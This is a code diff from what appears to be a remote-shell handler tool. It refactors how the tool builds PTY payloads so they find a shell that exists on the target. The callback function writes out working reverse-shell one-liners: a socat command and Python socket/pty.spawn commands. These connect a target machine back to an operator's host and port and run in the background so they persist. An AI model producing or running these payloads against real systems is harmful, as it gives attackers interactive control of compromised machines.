@@ -110,6 +110,19 @@ def _guess_os(kernel: str) -> str:
     return ""
 
 
+def _resolve_pwsh(shell: str = "") -> str:
+    """A ``sh`` snippet that sets and exports ``$PWSH`` to a shell that actually
+    exists on the target: operator choice / ``$SHELL`` first, then ``bash``, then
+    ``sh``. Shared by both PTY payloads so neither hard-codes ``/bin/bash`` —
+    which does not exist on Alpine / busybox / many containers."""
+    head = f"PWSH={shlex.quote(shell)}" if shell else 'PWSH="${SHELL:-}"'
+    return head + (
+        '; [ -x "$PWSH" ] || PWSH="$(command -v bash 2>/dev/null)"'
+        '; [ -x "$PWSH" ] || PWSH="$(command -v sh 2>/dev/null)"'
+        "; export PWSH"
+    )
+
+
 def pty_upgrade_payload(
     rows: int = 32,
     cols: int = 120,
@@ -138,19 +151,10 @@ def pty_upgrade_payload(
     ready = f"@@PW_PTY_READY_{secrets.token_hex(4)}@@"
     fail = f"@@PW_PTY_FAIL_{secrets.token_hex(4)}@@"
 
-    # Resolve a shell that ACTUALLY EXISTS on the target. The old payload
-    # hard-coded /bin/bash (via an un-exported var), so it blew up on bash-less
-    # hosts like Alpine. Prefer the operator's choice / $SHELL, then bash, then
-    # sh — exported as $PWSH so the Python relay below can read it.
-    if shell:
-        shell_resolve = f"PWSH={shlex.quote(shell)}"
-    else:
-        shell_resolve = 'PWSH="${SHELL:-}"'
-    shell_resolve += (
-        '; [ -x "$PWSH" ] || PWSH="$(command -v bash 2>/dev/null)"'
-        '; [ -x "$PWSH" ] || PWSH="$(command -v sh 2>/dev/null)"'
-        "; export PWSH"
-    )
+    # Resolve a shell that ACTUALLY EXISTS on the target (see _resolve_pwsh):
+    # operator choice / $SHELL, then bash, then sh — exported as $PWSH so the
+    # Python relay below can read it. Never hard-codes /bin/bash.
+    shell_resolve = _resolve_pwsh(shell)
 
     # Python relay: fork a real PTY, exec the shell, and VERIFY the child
     # survived the exec before declaring success. On failure it emits the fail
@@ -219,39 +223,42 @@ def pty_upgrade_payload(
 
 def callback_pty_payload(host: str, port: int) -> str:
     """Build a fire-and-forget shell payload that opens a *new* socket back to us
-    with a real PTY around bash. Caller's existing dumb shell stays as-is —
-    the new connection lands as a fresh session in the registry.
+    with a real PTY around the target's shell. Caller's existing dumb shell stays
+    as-is — the new connection lands as a fresh session in the registry.
 
     Strategy preference (target side):
-      1. socat   — cleanest: `tcp:HOST:PORT exec:/bin/bash,pty,stderr,setsid,sigint,sane`
-      2. python3 — fresh socket + pty.spawn(["/bin/bash","-i"])
+      1. socat   — cleanest: `tcp:HOST:PORT exec:"$PWSH",pty,stderr,setsid,sigint,sane`
+      2. python3 — fresh socket + pty.spawn(["$PWSH","-i"])
       3. python  — same as above for Python 2 hosts
       4. fail marker — caller sees `@@PW_RECONNECT_FAIL@@` in scrollback
 
-    We background each via `(... &)` so the spawned proc is reparented to init
-    and survives the original shell exiting.
+    The shell is resolved on-target to one that exists (see _resolve_pwsh) rather
+    than hard-coding /bin/bash, so bash-less hosts (Alpine, busybox) still land a
+    PTY. $PWSH is exported, so the `(... &)` subshells inherit it. We background
+    each via `(... &)` so the spawned proc is reparented to init and survives the
+    original shell exiting.
     """
     err = validate_target(host, port)
     if err:
         raise ValueError(err)
     h = host
     p = int(port)
-    socat_cmd = (
-        f"socat tcp:{h}:{p} exec:/bin/bash,pty,stderr,setsid,sigint,sane"
-    )
+    resolve = _resolve_pwsh()
+    socat_cmd = f'socat tcp:{h}:{p} exec:"$PWSH",pty,stderr,setsid,sigint,sane'
     py3_cmd = (
         "python3 -c \"import socket,os,pty;"
         f"s=socket.socket();s.connect(('{h}',{p}));"
         "[os.dup2(s.fileno(),f) for f in (0,1,2)];"
-        "pty.spawn(['/bin/bash','-i'])\""
+        "pty.spawn(['$PWSH','-i'])\""
     )
     py2_cmd = (
         "python -c \"import socket,os,pty;"
         f"s=socket.socket();s.connect(('{h}',{p}));"
         "[os.dup2(s.fileno(),f) for f in (0,1,2)];"
-        "pty.spawn(['/bin/bash','-i'])\""
+        "pty.spawn(['$PWSH','-i'])\""
     )
     return (
+        f"{resolve}; "
         "if command -v socat >/dev/null 2>&1; then "
         f"({socat_cmd} >/dev/null 2>&1 &); "
         "elif command -v python3 >/dev/null 2>&1; then "
